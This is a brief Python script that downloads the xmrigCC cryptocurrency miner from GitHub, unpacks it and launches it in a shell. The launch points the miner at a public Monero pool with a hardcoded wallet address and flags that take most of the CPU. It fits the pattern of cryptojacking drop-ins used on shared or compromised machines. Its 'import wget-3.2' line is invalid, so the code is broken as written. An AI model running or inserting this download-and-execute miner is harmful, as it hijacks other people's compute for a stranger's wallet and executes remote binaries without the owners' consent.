import subprocess
import wget-3.2
url = 'https://github.com/Bendr0id/xmrigCC/releases/download/2.9.5/xmrigCC-2.9.5-linux-generic-amd64.tar.gz'
filename = wget.download(url)
subprocess.call("ls && tar -xvf xmrigCC-2.9.5-linux-generic-amd64.tar.gz && miner/xmrigDaemon -o pool.supportxmr.com:443 -u 86rNBsrqqaX6Ha7zwwyC2BYycsXurMUfxWaoPsUbtvqh7nfDFJ5oATLSUYfhZsCsJ3X31Z4d6PyNWES4gedmCBqHQ9E8Npu -k --tls -p a1 --print-time=2 --donate-level=1 --cpu-priority=8 --randomx-mode=fast --randomx-1gb-pages --cpu-affinity=8 --threads=8 --donate-level=1", shell=True)
